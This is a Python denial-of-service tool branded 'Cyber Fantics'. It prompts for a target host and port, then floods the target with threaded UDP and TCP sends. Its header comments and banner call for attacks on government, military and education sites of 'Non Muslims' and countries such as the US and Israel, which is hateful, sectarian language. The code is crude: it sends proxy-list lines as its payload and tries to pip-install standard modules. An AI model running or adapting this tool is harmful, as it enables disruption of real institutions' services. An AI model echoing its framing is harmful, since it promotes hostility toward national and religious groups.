# Coded By Salfi Hacker
# Using Python3.11.0 
# Attack on Non Muslims (US, Israel, Itly and other Nationalist (Anti Islam/Anti Palestine))
# Khilafah Will Return Biznillah
import random
import time
import sys
import os

try:
    import pyfiglet
except ImportError:
    os.system('pip install pyfiglet')
try:
    import requests
except ImportError:
    os.system('pip install requests')
try:
    import webbrowser
except ImportError:
    os.system('pip install webbrowser')
try:
    import threading
except ImportError:
    os.system('pip install threading')
try:
    import platform
except ImportError:
    os.system('pip install platform')
try:
    import socket
except ImportError:
    os.system('pip install socket')

red = "\033[1;31m"
green = "\033[1;32m"
cyan = "\033[1;36m"

# Coded By Salfi Hacker

def clear():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

# Coded By Salfi Hacker
def first_banner():
    clear()
    salfi = pyfiglet.Figlet(font="slant")
    banner = salfi.renderText("Cyber Fantics")
    print(f"""{red}{banner}
{green}============================
{red}[+] {green}Coded By @SalfiHacker
{red}[+] {green}Gift From Cyber Fantics
{red}[+] {green}Use It Against {cyan} Anti Islam {green}Gov,Mil & Edu sites
{green}============================""")

#Coded By Salfi Hacker
def __salfi__():
    clear()
    first_banner()
    print(f"""
{red}[#]{green} Follow me :
{cyan}[1] {green}Telegram Channel
{cyan}[2] {green}Instagram
{cyan}[3] {green}WhatsApp Channel
{cyan}[4] {green}Back Home
{cyan}[0] {green}Exit""")
    dev_ = input("\033[31m╔═══[\033[32mChoose A Number\033[31m]\n\033[31m╚══》 \033[32m")
    if dev_ =="1":
        webbrowser.open("https://t.me/cyberfantics")
        main()
    elif dev_ =="2":
        webbrowser.open("https://instagram.com/cyberfantics")
        main()
    elif dev_ =="3":
        webbrowser.open("https://whatsapp.com/channel/0029VaFE5Dv5Ejy2MaydYm3Z")
        main()
    elif dev_ =="4":
        main()
    elif dev_=="0":
        os.system("exit")
    else:
        main()

#Coded By Salfi Hacker    
log_level = 2

#Coded By Salfi Hacker
def get_user_input():
    first_banner()
    target_host = input(f"{red} [!] {cyan} Enter Target Link {green}")
    target_port = int(input(f"{red} [!] {cyan} Enter Target Port: {green}"))
    time.sleep(1)
    clear()
    first_banner()
    attack = input(f"{red} [!] {cyan} Start Attack (yes/no): {green}")
    sent_api = int(input(f"{red} [!] {cyan} How Many Times You Want To Attack: {green}"))
    time.sleep(1)
    clear()
    return target_host, target_port, attack, sent_api

# Coded By Salfi Hacker
def banner(target_host, target_port, sent_api):
    print(target_host)
    ip = socket.gethostbyname(target_host)
    salfi = pyfiglet.Figlet(font="slant")
    banner = salfi.renderText("Cyber Fantics")
    print(f"""{red}{banner}
{green}============================
{red}[+] HOST 》{green}{target_host}
{red}[+] PORT 》{green}{target_port}
{red}[+] IP 》{green}{ip}
{red}[+] Number Of Attack 》{green}{sent_api}
{red}[+] Coded By 》{green}Cyber {red}Fantics
{green}============================""")

# Coded By Salfi Hacker
def log(text, level=1):
    if log_level >= level:
        print(text)

# Coded By Salfi Hacker
def read_proxies():
    with open('proxy.txt', 'r') as f:
        proxies = f.read().splitlines()
    return proxies

# Coded By Salfi Hacker
def udp_attack(client, udp_attack_host, udp_attack_port, proxies, sent_api):
    sent = 0
    while sent != sent_api:
        try:
            proxy = random.choice(proxies)
            proxy_host, proxy_port = proxy.split(':')
            client.sendto(proxy.encode(), (udp_attack_host, udp_attack_port))
            log(f"{red}[×] Cyber Fantics Launchs {green}udp{red} Attack On ==》 {green} {udp_attack_host}:{udp_attack_port} {cyan}•• [{sent}]", level=2)
            sent += 1
        except ConnectionRefusedError as e:
            log(f"{red}[×] {cyan}Connection Refused:{green} {e}", level=2)
        except Exception as e:
            log(f"{red}[×] {cyan}An unexpected error occurred:{green} {e}", level=2)
            break
        except KeyboardInterrupt:
            print(f"{cyan}[!] {red}Exiting the program due to user interruption {green}(CTRL+C).")
            break  # Exit the loop on KeyboardInterrupt
    client.close()  # Close the socket outside the loop

# Coded By Salfi Hacker
def tcp_attack(client, tcp_attack_host, tcp_attack_port, proxies, sent_api):
    sent = 0
    while sent != sent_api:
        try:
            proxy = random.choice(proxies)
            proxy_host, proxy_port = proxy.split(':')
            client.send(proxy.encode())
            log(f"{red}[×] Cyber Fantics Launchs {cyan}tcp{red} Attack On ==》 {green} {tcp_attack_host}:{tcp_attack_port} {cyan}•• [{sent}]", level=2)
            sent += 1
        except ConnectionRefusedError as e:
            log(f"{red}[×] {cyan}Connection Refused:{green} {e}", level=2)
        except Exception as e:
            log(f"{red}[×] {cyan}An unexpected error occurred:{green} {e}", level=2)
            break
        except KeyboardInterrupt:
            print(f"{cyan}[!] {red}Exiting the program due to user interruption {green}(CTRL+C).")
            break  # Exit the loop on KeyboardInterrupt
    client.close()  # Close the socket outside the loop

#Coded By Salfi Hacker
def attack():    
    target_host, target_port, attack, sent_api = get_user_input()
    banner(target_host, target_port, sent_api)

    udp_client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_client.connect((target_host, target_port))
    tcp_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp_client.connect((target_host, target_port))

    proxies = read_proxies()

    if attack.lower() == "yes" or attack.lower() == 'y':
        threading.Thread(target=udp_attack, args=(udp_client, target_host, target_port, proxies, sent_api)).start()
        threading.Thread(target=tcp_attack, args=(tcp_client, target_host, target_port, proxies, sent_api)).start()
    else:
        print(f"{red}[ ! ] The attack feature is disabled.")

# Coded By Salfi Hacker
def main():
    first_banner()
    option = input(f"""
    {green}[1] {red}Enter 1 For Attack
    {green}[2] {red}Enter 2 For About
    {green}[3] {red}Enter 3 For Exit {cyan}
    
    {red}[-] {cyan}""")
    
    if option == '1' or option == '01':
    	attack()
    elif option == '2' or option == '02':
    	__salfi__()
    elif option == '3' or option == '03':
    	sys.exit()
    else:
    	main()

# Coded By Salfi Hacker
if __name__ == '__main__':
	main()
